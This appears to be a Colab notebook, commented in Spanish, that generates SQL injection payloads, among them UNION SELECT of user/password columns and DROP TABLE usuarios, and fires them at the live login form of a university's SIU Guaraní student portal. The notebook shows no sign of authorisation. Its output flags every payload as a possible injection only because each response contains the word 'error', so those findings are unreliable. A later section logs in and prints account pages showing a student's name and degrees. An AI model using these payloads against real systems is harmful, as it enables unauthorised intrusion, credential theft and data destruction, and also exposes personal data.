{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib.parse\n",
        "\n",
        "def generate_sql_payloads(original_value):\n",
        "    payloads = []\n",
        "    payloads.append(original_value)\n",
        "    # original_value = \"'\" + original_value\n",
        "\n",
        "    payloads.append(\"105; DROP TABLE Suppliers\")\n",
        "    payloads.append(\" or \"\"=\")\n",
        "    payloads.append(\"105 OR 1=1\")\n",
        "    # Payloads para probar la existencia de vulnerabilidad\n",
        "    payloads.append(original_value + \"' OR '1'='1\")\n",
        "    payloads.append(original_value + \"' OR 1=1; --\")\n",
        "    payloads.append(original_value + \"' UNION SELECT null, usuario, password FROM usuarios; --\")\n",
        "    payloads.append(original_value + \"' /*\")\n",
        "\n",
        "    # Payloads para probar errores de sintaxis\n",
        "    payloads.append(original_value + \"' OR '1'='1' --\")\n",
        "    payloads.append(original_value + \"' OR 1=1;#\")\n",
        "    payloads.append(original_value + \"' AND 1=1 --\")\n",
        "    payloads.append(original_value + \"' AND '1'='1' --\")\n",
        "\n",
        "    # Payloads para comentarios y anulación de consulta\n",
        "    payloads.append(original_value + \"'--\")\n",
        "    payloads.append(original_value + \"'; --\")\n",
        "    payloads.append(original_value + \"'; DROP TABLE usuarios; --\")\n",
        "\n",
        "    # Payloads para probar concatenación de consultas\n",
        "    payloads.append(original_value + \"'; SELECT * FROM users WHERE id = '1\")\n",
        "\n",
        "    # Payloads para probar UNION con otras consultas\n",
        "    payloads.append(original_value + \"' UNION SELECT user, password FROM users; --\")\n",
        "\n",
        "    # Payloads para probar uso de funciones SQL\n",
        "    payloads.append(\"1; DROP TABLE usuarios; --\")\n",
        "    payloads.append(\"1; SELECT COUNT(*) FROM users; --\")\n",
        "\n",
        "    # Payloads para probar inyección de comentarios\n",
        "    payloads.append(original_value + \"' OR '1'='1' /*\")\n",
        "\n",
        "    # Payloads para probar inyección en nombres de tablas\n",
        "    payloads.append(original_value + \"' UNION SELECT user, password FROM \" + original_value + \"; --\")\n",
        "\n",
        "    return payloads\n",
        "\n"
      ],
      "metadata": {
        "id": "XD4cOK2eP4Sc"
      },
      "execution_count": 107,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def sp2(url):\n",
        "    original_username = \"xxxx' -- \"\n",
        "    target_url = url\n",
        "\n",
        "    payloads = generate_sql_payloads(original_username)\n",
        "    responses_list = []  # Lista para almacenar las respuestas\n",
        "\n",
        "    for payload in payloads:\n",
        "        # Crear un diccionario con el campo de entrada (por ejemplo, \"username\") y el payload SQL modificado\n",
        "        data = {\n",
        "            \"usuario\": payload,\n",
        "\n",
        "            \"password\": \" OR user='xxxx' -- \" # Puedes incluir más campos aquí según el formulario\n",
        "        }\n",
        "\n",
        "        # Enviar la solicitud POST con el payload SQL modificado\n",
        "        response = requests.post(target_url, data=data)\n",
        "\n",
        "        # Acceder al contenido HTML de la respuesta\n",
        "        html_content = response.text\n",
        "\n",
        "        # Agregar la respuesta a la lista de respuestas\n",
        "        responses_list.append(html_content)\n",
        "\n",
        "        # Realizar el análisis del contenido HTML para detectar posibles inyecciones de SQL.\n",
        "        # Por ejemplo, podrías buscar mensajes de error de la base de datos, contenido inusual, etc.\n",
        "        if \"error\" in html_content.lower():\n",
        "            print(f\"Posible inyección de SQL detectada con el payload: {payload}\")\n",
        "        else:\n",
        "            print(f\"No se encontraron indicios de inyección de SQL con el payload: {payload}\")\n",
        "\n",
        "    return responses_list  # Devolver la lista de respuestas\n",
        "\n",
        "# if __name__ == \"__main__\":\n",
        "#     responses = main()\n",
        "#     # Imprimir todas las respuestas almacenadas en la lista\n",
        "#     for idx, response in enumerate(responses, start=1):\n",
        "#         print(f\"Respuesta {idx}:\\n{response}\\n\")\n"
      ],
      "metadata": {
        "id": "gdNX4THFdjWs"
      },
      "execution_count": 110,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "l = sp2(\"https://guarani.unt.edu.ar:443/autogestion/acceso?auth=form\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "H78o9BIdeERL",
        "outputId": "7e77b535-55fd-4ac9-b606-86bf2d99139c"
      },
      "execution_count": 111,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Posible inyección de SQL detectada con el payload: xxxx' -- \n",
            "Posible inyección de SQL detectada con el payload: 105; DROP TABLE Suppliers\n",
            "Posible inyección de SQL detectada con el payload:  or =\n",
            "Posible inyección de SQL detectada con el payload: 105 OR 1=1\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' OR '1'='1\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' OR 1=1; --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' UNION SELECT null, usuario, password FROM usuarios; --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' /*\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' OR '1'='1' --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' OR 1=1;#\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' AND 1=1 --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' AND '1'='1' --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- '--\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- '; --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- '; DROP TABLE usuarios; --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- '; SELECT * FROM users WHERE id = '1\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' UNION SELECT user, password FROM users; --\n",
            "Posible inyección de SQL detectada con el payload: 1; DROP TABLE usuarios; --\n",
            "Posible inyección de SQL detectada con el payload: 1; SELECT COUNT(*) FROM users; --\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' OR '1'='1' /*\n",
            "Posible inyección de SQL detectada con el payload: xxxx' -- ' UNION SELECT user, password FROM xxxx' -- ; --\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "l[0]\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 955
        },
        "id": "05o3ctOPq7g8",
        "outputId": "458c6997-43a4-42cc-806c-3f0fc1fa7a70"
      },
      "execution_count": 109,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        \\n\\t\\t    \\t\\n\\t\\n\\n\\n\\n\\n\\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0\">\\n<link rel=\"icon\" href=\"/autogestion/_comp/siu/img/favicon.ico\" type=\"image/x-icon\" />\\n\\n<title>SIU Guaraní - Acceso</title>\\n\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/siu/js/guarani_mash.js\\' charset=\"iso-8859-1\"></script>\\n\\t\\t\\t<link type=\\'text/css\\' href=\\'/autogestion/_comp/siu/css/guarani_mash.css\\' rel=\\'stylesheet\\' />\\n\\t\\t\\t\\n    <!-- No se agrega en \"guarani_mash.css\" porque sino pierde la referencia de las fuentes -->\\n    <link type=\\'text/css\\' href=\\'/autogestion/css/font-awesome-4.6.3/css/font-awesome.min.css\\' rel=\\'stylesheet\\' />\\n\\n\\n\\n<!--[if lt IE 9]>\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/js/html5.js\\'></script>\\n<![endif]-->\\n\\n\\t \\n\\t\\n<script type=\\'text/javascript\\'>\\nvar kernel_config = {\\n\\twidget_count: 2,\\n\\t// Stalls js load until all widgets have loaded css and rendered its content\\n\\tstall_js: false,\\n\\tlog: true,\\n\\talias: \\'/autogestion\\',\\n\\tpretty_urls: true,\\n\\top_default: \\'acceso\\',\\n\\top_actual: \\'acceso\\',\\n\\thistoria_activa: false,\\n\\t\\tes_produccion: true\\n};\\nvar url_cambio_perfil = \"\";\\nvar url_cambio_carrera = \"\";\\n\\nvar autocompletar_input_habilitado = false;\\n\\n</script>\\n    </head>\\n    \\n    <body>\\n        <div class=\"brand-nav\">\\n    <div class=\"container\">\\n\\t\\t<div class=\"row-fluid\">\\n\\t\\t\\t<div class=\"span3\">\\n\\t\\t\\t\\t<a class=\"brand\" href=\"https://guarani.unt.edu.ar:443/autogestion/acceso\"><img src=\"/autogestion/_comp/siu/img/logo-transparente.png\" /></a>\\n\\t\\t\\t</div>\\n\\n\\t\\t\\t<div class=\"span9\">\\n\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t</div>\\n    </div>\\n</div>\\n<div class=\"navbar main-nav\">\\n\\t<div class=\"navbar-inner\">\\n\\t\\t<div class=\"container\">\\n\\t\\t\\t<div role=\"navigation\">\\n\\t\\t\\t\\t\\t\\t\\t\\t<ul id=\\'js-nav\\' class=\\'nav\\'>\\n                                    \\n                                                                \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'acceso\\' class=\\'js-menuitem-root menu-item-seleccionado\\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/acceso\\'>Acceso</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'fecha_examen\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/fecha_examen\\'>Fechas de Examen</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'horarios_cursadas\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/horarios_cursadas\\'>Horarios de Cursadas</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'validador_certificados\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/validador_certificados\\'>Validador de Certificados</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'ayuda_menu\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/ayuda_menu\\'>Ayuda</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t                                \\n                    \\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\t\\t</div><!--/.nav-collapse -->\\n\\t\\t</div><!-- container-fluid -->\\n\\t</div><!-- navbar-inner -->\\n</div><!-- navbar -->\\n\\n<!-- https://gist.github.com/tentacode/3892186 -->\\n\\n        <div id=\\'loading\\'></div>\\n\\t\\t<div id=\\'loading_top\\' style=\\'display:none;\\'>Cargando...</div>\\n\\t\\t<div id=\\'_msg_placeholder\\' style=\\'display:none;\\' class=\"msg_placeholder alert-success\"></div>\\n\\t\\t<div id=\\'kernel_contenido\\' class=\"container\">\\n\\t\\t\\t\\t\\t\\t\\n<div id=\\'layout_dos_columnas\\' class=\"row-fluid\">\\n    <div id=\\'columna_1\\' class=\"span5\">\\t<div id=\\'login\\'  class=\\'pagelet\\'></div>\\n</div>\\n    <div id=\\'columna_2\\' class=\"span7\">\\t<div id=\\'contenido_login\\'  class=\\'pagelet\\'></div>\\n</div>\\n</div>\\n\\n\\t\\t\\t<script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/contenido_login\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/contenido_login\\\\/pagelet_contenido_login.js\"],\"op\":\"acceso\",\"info\":{\"id\":\"contenido_login\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":[]},\"content\":\"<h2>SIU Guaran\\\\u00ed<\\\\/h2><p>Algunas de las cosas que pod\\\\u00e9s hacer con este sistema son:<\\\\/p><ul><li>Inscribirte a materias y ex\\\\u00e1menes.<\\\\/li><li>Consultar el plan de tu propuesta.<\\\\/li><li>Consultar tu historia acad\\\\u00e9mica.<\\\\/li><li>Actualizar tus datos personales.<\\\\/li><li>Recibir alertas sobre per\\\\u00edodos de inscripci\\\\u00f3n o vencimiento de ex\\\\u00e1menes finales.<\\\\/li><\\\\/ul>\",\"clase_js\":\"contenido_login\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/login\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/login\\\\/pagelet_login.js\"],\"op\":\"acceso\",\"info\":{\"id\":\"login\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":{\"id_requerido\":\"El nombre de usuario es requerido. <br\\\\/>Por favor intenta de nuevo.\",\"clave_requerida\":\"La contrase\\\\u00f1a es requerida. <br\\\\/>Por favor intenta de nuevo.\"}},\"content\":\"<hr\\\\/><script src=\\\\\"https:\\\\/\\\\/www.google.com\\\\/recaptcha\\\\/api.js?hl=es-419&render=onload\\\\\" async defer><\\\\/script><h2>Ingres\\\\u00e1 tus datos<\\\\/h2><form method=\\\\\"post\\\\\" action=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/acceso?auth=form\\\\\" id=\\\\\"guarani_form_login\\\\\"><div class=\\\\\"control-group\\\\\"><label class=\\\\\"control-label\\\\\" for=\\\\\"usuario\\\\\">Usuario<\\\\/label><div class=\\\\\"controls\\\\\"><input id=\\\\\"usuario\\\\\" name=\\\\\"usuario\\\\\" type=\\\\\"text\\\\\" value=\\\\\"\\\\\" maxlength=\\\\\"60\\\\\"\\\\/><\\\\/div><\\\\/div><div class=\\\\\"control-group\\\\\"><label class=\\\\\"control-label\\\\\" for=\\\\\"password\\\\\">Contrase\\\\u00f1a<\\\\/label><div class=\\\\\"controls\\\\\"><input id=\\\\\"password\\\\\" name=\\\\\"password\\\\\" type=\\\\\"password\\\\\" value=\\\\\"\\\\\" maxlength=\\\\\"20\\\\\"\\\\/><\\\\/div><\\\\/div><div class=\\\\\"control-group\\\\\"><div class=\\\\\"controls\\\\\"><input id=\\\\\"login\\\\\"  name=\\\\\"login\\\\\" type=\\\\\"submit\\\\\" value=\\\\\"Ingresar\\\\\" class=\\\\\"btn btn-info\\\\\"\\\\/><\\\\/div><\\\\/div><\\\\/form><div id=\\\\\"error_login\\\\\" class=\\'alert alert-error\\'>\\\\n                El nombre de usuario y\\\\/o contrase\\\\u00f1a es incorrecto. <br\\\\/>Por favor intenta de nuevo.\\\\n            <\\\\/div><a href=\\'https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/acceso\\\\/recuperar\\'>\\\\u00bfOlvidaste tu contrase\\\\u00f1a o sos un usuario nuevo?<\\\\/a><hr\\\\/>\\\\n        Si dese\\\\u00e1s inscribirte a cursos, <strong>y no ten\\\\u00e9s usuario y clave de acceso al sistema<\\\\/strong>, pod\\\\u00e9s crearlo accediendo <a href=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/alta_usuario_cursos\\\\\">aqu\\\\u00ed<\\\\/a>.\\\\n        \\\\n    <hr\\\\/>\",\"clase_js\":\"login\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel_config.pagelet_count = 2</script>\\n\\t\\t\\t\\t\\t</div>\\n        \\n        <footer>\\n    <div class=\\'container\\'>\\n\\t<div class=\"row\">\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyleft\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyright\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t</div>\\n    </div>\\n</footer>\\n\\t\\t<a id=\"back-to-top\" href=\"#\" class=\"btn btn-inverse btn-large\" role=\"button\" title=\"Ir arriba\">\\n\\t\\t\\t<i class=\"fa fa-chevron-up\" aria-hidden=\"true\"></i>\\n\\t\\t</a>\\n\\n    </body>\\n</html>'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 109
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Entro a mi cuenta mediante request**"
      ],
      "metadata": {
        "id": "1O1vJWoZ5anQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "target_url = \"https://guarani.unt.edu.ar:443/autogestion/acceso?auth=form\""
      ],
      "metadata": {
        "id": "in5_7MRcf9Dh"
      },
      "execution_count": 23,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "data = {\n",
        "            \"usuario\": \"XXXXX\",\n",
        "            \"password\": \"XXXXXXX\"  # Puedes incluir más campos aquí según el formulario\n",
        "        }"
      ],
      "metadata": {
        "id": "TXNSkUkXgKBs"
      },
      "execution_count": 63,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        " # Enviar la solicitud POST con el payload SQL modificado\n",
        "response = requests.post(target_url, data=data)\n",
        "\n",
        "# Acceder al contenido HTML de la respuesta\n",
        "html_content = response.text"
      ],
      "metadata": {
        "id": "5LGIurrof5kS"
      },
      "execution_count": 25,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "html_content"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "6u6RmBQpg6Ql",
        "outputId": "563f2121-8f14-47dd-ee47-84f45b6a63c3"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        \\n\\t\\t    \\t\\n\\t\\n\\n\\n\\n\\n\\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0\">\\n<link rel=\"icon\" href=\"/autogestion/_comp/siu/img/favicon.ico\" type=\"image/x-icon\" />\\n\\n<title>SIU Guaraní - Carreras</title>\\n\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/siu/js/guarani_mash.js\\' charset=\"iso-8859-1\"></script>\\n\\t\\t\\t<link type=\\'text/css\\' href=\\'/autogestion/_comp/siu/css/guarani_mash.css\\' rel=\\'stylesheet\\' />\\n\\t\\t\\t\\n    <!-- No se agrega en \"guarani_mash.css\" porque sino pierde la referencia de las fuentes -->\\n    <link type=\\'text/css\\' href=\\'/autogestion/css/font-awesome-4.6.3/css/font-awesome.min.css\\' rel=\\'stylesheet\\' />\\n\\n\\n\\n<!--[if lt IE 9]>\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/js/html5.js\\'></script>\\n<![endif]-->\\n\\n\\t \\n\\t\\n<script type=\\'text/javascript\\'>\\nvar kernel_config = {\\n\\twidget_count: 3,\\n\\t// Stalls js load until all widgets have loaded css and rendered its content\\n\\tstall_js: false,\\n\\tlog: true,\\n\\talias: \\'/autogestion\\',\\n\\tpretty_urls: true,\\n\\top_default: \\'inicio_alumno\\',\\n\\top_actual: \\'inicio_alumno\\',\\n\\thistoria_activa: false,\\n\\t\\tes_produccion: true\\n};\\nvar url_cambio_perfil = \"https://guarani.unt.edu.ar:443/autogestion/acceso/perfil\";\\nvar url_cambio_carrera = \"https://guarani.unt.edu.ar:443/autogestion/acceso/cambiar_carrera\";\\n\\nvar autocompletar_input_habilitado = false;\\n\\n</script>\\n\\t<script type=\"text/javascript\">\\n\\t  var _gaq = _gaq || [];\\n\\t  _gaq.push([\\'_setAccount\\', \\'UA-xxx-y\\' ]);\\n\\t  \\t  _gaq.push([\\'_trackPageview\\']);\\n\\n\\t  (function() {\\n\\t\\tvar ga = document.createElement(\\'script\\'); ga.type = \\'text/javascript\\'; ga.async = true;\\n\\t\\tga.src = (\\'https:\\' == document.location.protocol ? \\'https://ssl\\' : \\'http://www\\') + \\'.google-analytics.com/ga.js\\';\\n\\t\\tvar s = document.getElementsByTagName(\\'script\\')[0]; s.parentNode.insertBefore(ga, s);\\n\\t  })();\\n</script>\\n    </head>\\n    \\n    <body>\\n        <div class=\"brand-nav\">\\n    <div class=\"container\">\\n\\t\\t<div class=\"row-fluid\">\\n\\t\\t\\t<div class=\"span3\">\\n\\t\\t\\t\\t<a class=\"brand\" href=\"https://guarani.unt.edu.ar:443/autogestion/inicio_alumno\"><img src=\"/autogestion/_comp/siu/img/logo-transparente.png\" /></a>\\n\\t\\t\\t</div>\\n\\n\\t\\t\\t<div class=\"span9\">\\n\\t\\t\\t\\t\\t\\t\\t<div class=\"row-fluid\">\\n\\t\\t\\t\\t\\t<div class=\"span12\">\\n\\t\\t\\t\\t\\t\\t<div class=\"navbar user-navbar clearfix\">\\n\\t\\t\\t\\t\\t\\t\\t<ul class=\"nav pull-right\">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\n                                 \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\t\\t\\t<li class=\"notificaciones\">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t<a href=\"https://guarani.unt.edu.ar:443/autogestion/mensajes\">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t<i class=\"icon-envelope\"></i>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t<span id=\\'js-cant-mensajes\\' class=\"badge \">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t0\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t</span>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t</a>\\n\\t\\t\\t\\t\\t\\t\\t\\t</li>\\n\\t\\t\\t\\t\\t\\t\\t\\t<li class=\"dropdown\">\\n\\t\\t\\t\\t\\t\\t\\t\\t<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"><i class=\"icon-user\"></i> Pablo Guillermo Contreras <b class=\"caret\"></b></a>\\n\\t\\t\\t\\t\\t\\t\\t\\t<ul class=\"dropdown-menu\">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t<li><a href=\\'https://guarani.unt.edu.ar:443/autogestion/configuracion\\'><i class=\"icon-cog\"></i> Configuración</a></li>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t<li><a href=\\'https://guarani.unt.edu.ar:443/autogestion/acceso/logout\\' class=\"no-ajax\"><i class=\"icon-off\"></i> Cerrar sesión</a></li>\\n\\t\\t\\t\\t\\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\t\\t\\t\\t</li>\\n\\t\\t\\t\\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t</div>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t<div class=\"row-fluid\">\\n\\t\\t\\t\\t\\t<div class=\"span12\">\\n\\t\\t\\t\\t\\t\\t<div class=\"form-horizontal carreras\">\\n\\t\\t\\t\\t\\t\\t\\t<div class=\"pull-right control-group\">\\n\\t\\t\\t\\t\\t\\t\\t                                                            \\n                                                                <label id=\"label-select-carreras\">Propuesta: </label>\\n                                                                <div class=\"btn-group\">\\n                                                                    <button id=\"js-dropdown-toggle-carreras\" class=\"btn dropdown-toggle\" data-toggle=\"dropdown\">Ingeniería geodésica y geofísica <span class=\"caret\"></span></button>\\n                                                                    <ul id=\"js-dropdown-menu-carreras\" class=\"dropdown-menu pull-right\">\\n                                                                                                                                                                                                                                                                                                            <li>\\n                                                                                <a href=\"#\" class=\"js-select-carreras selected \" data-carrera-id=\"33\" data-carrera-selected=\"1\" data-toggle=\"tooltip\" data-placement=\"left\" data-container=\"body\" title=\"Ingeniería geodésica y geofísica\">\\n                                                                                    <i class=\"icon-ok\"></i> Ingeniería geodésica y geofísica\\n                                                                                </a>\\n                                                                            </li>\\n                                                                                                                                                                                                                                                                                                            <li>\\n                                                                                <a href=\"#\" class=\"js-select-carreras  \" data-carrera-id=\"28\" data-carrera-selected=\"\" data-toggle=\"tooltip\" data-placement=\"left\" data-container=\"body\" title=\"Licenciatura en física\">\\n                                                                                    Licenciatura en física\\n                                                                                </a>\\n                                                                            </li>\\n                                                                                                                                            </ul>\\n                                                                </div>\\n                                                                    \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t</div>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t</div>\\n    </div>\\n</div>\\n<div class=\"navbar main-nav\">\\n\\t<div class=\"navbar-inner\">\\n\\t\\t<div class=\"container\">\\n\\t\\t\\t<div role=\"navigation\">\\n\\t\\t\\t\\t\\t\\t\\t\\t<ul id=\\'js-nav\\' class=\\'nav\\'>\\n                                    \\n                                                                \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'cursada\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/cursada\\'>Inscripción a Materias</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'examen\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/examen\\'>Inscripción a Exámenes</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                        <li class=\\'dropdown js-menuitem-root \\'>\\n                                                \\n        \\n            <a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">Reportes <b class=\"caret\"></b></a>\\n    \\n    <ul class=\\'dropdown-menu\\'>\\n\\n                                    \\n                                    \\n                                        <li id=\\'actuacion_provisoria\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/actuacion_provisoria\\'>Actuación provisoria</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'calendario\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/calendario\\'>Agenda</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'historia_academica\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/historia_academica\\'>Historia académica</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'reporte_inasistencias\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/reporte_inasistencias\\'>Inasistencias</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'inscripciones\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/inscripciones\\'>Mis inscripciones</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'cronograma_evaluaciones\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/cronograma_evaluaciones\\'>Cronograma de evaluaciones</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'oferta_comisiones\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/oferta_comisiones\\'>Oferta de comisiones</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'plan_estudio\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/plan_estudio\\'>Plan de estudios</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'estado_titulo\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/estado_titulo\\'>Seguimiento de Solicitud de Título</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'solicitudes_sidcer\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/solicitudes_sidcer\\'>Seguimiento de Solicitud de Título en el Ministerio de Educación</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'seguimiento_tesis\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/seguimiento_tesis\\'>Seguimiento de Tesis</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'reporte_readmisiones\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/reporte_readmisiones\\'>Reporte de Solicitudes de Readmisión</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li 